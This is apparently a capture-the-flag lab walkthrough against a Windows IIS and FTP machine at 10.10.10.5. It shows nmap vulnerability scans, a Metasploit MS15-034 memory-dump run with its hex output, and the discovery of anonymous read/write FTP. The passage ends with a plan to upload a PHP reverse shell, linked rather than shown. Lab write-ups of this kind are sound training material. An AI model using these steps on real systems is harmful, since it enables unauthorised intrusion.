## Another Day, Another NMAP
```
hippoeug@kali:~$ nmap -sC -sV -A --script=vuln 10.10.10.5 -v -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:20 +0
...
Discovered open port 80/tcp on 10.10.10.5
Discovered open port 21/tcp on 10.10.10.5
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
80/tcp open  http    Microsoft IIS httpd 7.5
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/7.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So we know there is a FTP server, and a HTTP server running IIS. Let's KIV.
Also, I wonder what does the vuln script show?
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.5 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:31 +08
NSE: Loaded 105 scripts for scanning.
...
Discovered open port 21/tcp on 10.10.10.5
Discovered open port 80/tcp on 10.10.10.5
Completed Connect Scan at 23:32, 6.36s elapsed (1000 total ports)
...
PORT   STATE SERVICE
21/tcp open  ftp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
80/tcp open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
|           
|     Disclosure date: 2015-04-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
|_      https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
```

## First Attack, MS15-034, CVE-2015-1635
Ezgame, another metasploit module!
```
msf5 > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump

+] Memory contents:
48 54 54 50 2f 31 2e 31 20 32 30 36 20 50 61 72    |HTTP/1.1 206 Par|
74 69 61 6c 20 43 6f 6e 74 65 6e 74 0d 0a 43 6f    |tial Content..Co|
6e 74 65 6e 74 2d 54 79 70 65 3a 20 74 65 78 74    |ntent-Type: text|
2f 68 74 6d 6c 0d 0a 4c 61 73 74 2d 4d 6f 64 69    |/html..Last-Modi|
66 69 65 64 3a 20 46 72 69 2c 20 31 37 20 4d 61    |fied: Fri, 17 Ma|
72 20 32 30 31 37 20 31 34 3a 33 37 3a 33 30 20    |r 2017 14:37:30 |
47 4d 54 0d 0a 41 63 63 65 70 74 2d 52 61 6e 67    |GMT..Accept-Rang|
65 73 3a 20 62 79 74 65 73 0d 0a 45 54 61 67 3a    |es: bytes..ETag:|
20 22 33 37 62 35 65 64 31 32 63 39 66 64 32 31    | "37b5ed12c9fd21|
3a 30 22 0d 0a 53 65 72 76 65 72 3a 20 4d 69 63    |:0"..Server: Mic|
72 6f 73 6f 66 74 2d 49 49 53 2f 37 2e 35 0d 0a    |rosoft-IIS/7.5..|
58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 41 53    |X-Powered-By: AS|
50 2e 4e 45 54 0d 0a 44 61 74 65 3a 20 4d 6f 6e    |P.NET..Date: Mon|
2c 20 33 30 20 4e 6f 76 20 32 30 32 30 20 32 33    |, 30 Nov 2020 23|
3a 33 39 3a 35 32 20 47 4d 54 0d 0a 43 6f 6e 74    |:39:52 GMT..Cont|
65 6e 74 2d 4c 65 6e 67 74 68 3a 20 36 38 38 0d    |ent-Length: 688.|
0a 43 6f 6e 74 65 6e 74 2d 52 61 6e 67 65 3a 20    |.Content-Range: |
62 79 74 65 73 20 31 2d 36 38 38 2f 36 38 39 0d    |bytes 1-688/689.|
0a 0d 0a 21 44 4f 43 54 59 50 45 20 68 74 6d 6c    |...!DOCTYPE html|
20 50 55 42 4c 49 43 20 22 2d 2f 2f 57 33 43 2f    | PUBLIC "-//W3C/|
2f 44 54 44 20 58 48 54 4d 4c 20 31 2e 30 20 53    |/DTD XHTML 1.0 S|
74 72 69 63 74 2f 2f 45 4e 22 20 22 68 74 74 70    |trict//EN" "http|
3a 2f 2f 77 77 77 2e 77 33 2e 6f 72 67 2f 54 52    |://www.w3.org/TR|
2f 78 68 74 6d 6c 31 2f 44 54 44 2f 78 68 74 6d    |/xhtml1/DTD/xhtm|
6c 31 2d 73 74 72 69 63 74 2e 64 74 64 22 3e 0d    |l1-strict.dtd">.|
0a 3c 68 74 6d 6c 20 78 6d 6c 6e 73 3d 22 68 74    |.<html xmlns="ht|
74 70 3a 2f 2f 77 77 77 2e 77 33 2e 6f 72 67 2f    |tp://www.w3.org/|
31 39 39 39 2f 78 68 74 6d 6c 22 3e 0d 0a 3c 68    |1999/xhtml">..<h|
65 61 64 3e 0d 0a 3c 6d 65 74 61 20 68 74 74 70    |ead>..<meta http|
2d 65 71 75 69 76 3d 22 43 6f 6e 74 65 6e 74 2d    |-equiv="Content-|
54 79 70 65 22 20 63 6f 6e 74 65 6e 74 3d 22 74    |Type" content="t|
65 78 74 2f 68 74 6d 6c 3b 20 63 68 61 72 73 65    |ext/html; charse|
74 3d 69 73 6f 2d 38 38 35 39 2d 31 22 20 2f 3e    |t=iso-8859-1" />|
0d 0a 3c 74 69 74 6c 65 3e 49 49 53 37 3c 2f 74    |..<title>IIS7</t|
69 74 6c 65 3e 0d 0a 3c 73 74 79 6c 65 20 74 79    |itle>..<style ty|
70 65 3d 22 74 65 78 74 2f 63 73 73 22 3e 0d 0a    |pe="text/css">..|
3c 21 2d 2d 0d 0a 62 6f 64 79 20 7b 0d 0a 09 63    |<!--..body {...c|
6f 6c 6f 72 3a 23 30 30 30 30 30 30 3b 0d 0a 09    |olor:#000000;...|
62 61 63 6b 67 72 6f 75 6e 64 2d 63 6f 6c 6f 72    |background-color|
3a 23 42 33 42 33 42 33 3b 0d 0a 09 6d 61 72 67    |:#B3B3B3;...marg|
69 6e 3a 30 3b 0d 0a 7d 0d 0a 0d 0a 23 63 6f 6e    |in:0;..}....#con|
74 61 69 6e 65 72 20 7b 0d 0a 09 6d 61 72 67 69    |tainer {...margi|
6e 2d 6c 65 66 74 3a 61 75 74 6f 3b 0d 0a 09 6d    |n-left:auto;...m|
61 72 67 69 6e 2d 72 69 67 68 74 3a 61 75 74 6f    |argin-right:auto|
3b 0d 0a 09 74 65 78 74 2d 61 6c 69 67 6e 3a 63    |;...text-align:c|
65 6e 74 65 72 3b 0d 0a 09 7d 0d 0a 0d 0a 61 20    |enter;...}....a |
69 6d 67 20 7b 0d 0a 09 62 6f 72 64 65 72 3a 6e    |img {...border:n|
6f 6e 65 3b 0d 0a 7d 0d 0a 0d 0a 2d 2d 3e 0d 0a    |one;..}....-->..|
3c 2f 73 74 79 6c 65 3e 0d 0a 3c 2f 68 65 61 64    |</style>..</head|
3e 0d 0a 3c 62 6f 64 79 3e 0d 0a 3c 64 69 76 20    |>..<body>..<div |
69 64 3d 22 63 6f 6e 74 61 69 6e 65 72 22 3e 0d    |id="container">.|
0a 3c 61 20 68 72 65 66 3d 22 68 74 74 70 3a 2f    |.<a href="http:/|
2f 67 6f 2e 6d 69 63 72 6f 73 6f 66 74 2e 63 6f    |/go.microsoft.co|
6d 2f 66 77 6c 69 6e 6b 2f 3f 6c 69 6e 6b 69 64    |m/fwlink/?linkid|
3d 36 36 31 33 38 26 61 6d 70 3b 63 6c 63 69 64    |=66138&amp;clcid|
3d 30 78 34 30 39 22 3e 3c 69 6d 67 20 73 72 63    |=0x409"><img src|
3d 22 77 65 6c 63 6f 6d 65 2e 70 6e 67 22 20 61    |="welcome.png" a|
6c 74 3d 22 49 49 53 37 22 20 77 69 64 74 68 3d    |lt="IIS7" width=|
22 35 37 31 22 20 68 65 69 67 68 74 3d 22 34 31    |"571" height="41|
31 22 20 2f 3e 3c 2f 61 3e 0d 0a 3c 2f 64 69 76    |1" /></a>..</div|
3e 0d 0a 3c 2f 62 6f 64 79 3e 0d 0a 3c 2f 68 74    |>..</body>..</ht|
6d 6c 3e                                           |ml>|
```
Ah crap, nothing interesting mang. Back to searching for vulnerabilties.

## NMAP, Second Attempt
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.5 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 23:44 +08
...
Discovered open port 80/tcp on 10.10.10.5
Discovered open port 21/tcp on 10.10.10.5
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Going to `http://10.10.10.5`, we see the IIS welcome page.
Trying `http://10.10.10.5/iisstart.htm` and `http://10.10.10.5/welcome.png` as seen on the FTP server, we get results! 
So they're indeed connected and linked! FTP could be a good vector to attack from! Let's check the FTP out.

## Finding Vulnerabilties for FTP & IIS
We see FTP on Port 21 has `Anonymous FTP login allowed (FTP code 230)`
```
msf5 > use auxiliary/scanner/ftp/anonymous
...
[+] 10.10.10.5:21         - 10.10.10.5:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
[*] 10.10.10.5:21         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Interesting, `Anonymous READ/WRITE (220 Microsoft FTP Service)`. Let's upload a f*\*ken reverse shell!
But what reverse shell? 

Doing some research (Source: https://www.atlantic.net/what-is-an-iis-server/), we see:
```
Because IIS uses C# and .NET web application frameworks like ASP.NET MVC and Entity Framework; additionally, it integrates with Visual Studio, all of which make it a popular choice for enterprises. Other key advantages are native .NET, ASPX and PHP support for modules and scripts, which allows web developers to create eye-catching, seamlessly designed content to their web creations.
```
Interesting, scripts for `.NET`, `ASPX` and `PHP` is supported. 

## Reverse Shell Upload
We can choose between `.NET`, `ASPX` and `PHP` scripts, but let me first attempt to upload a PHP reverse shell.

PHP reverse shell source: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Upload to FTP source: https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/


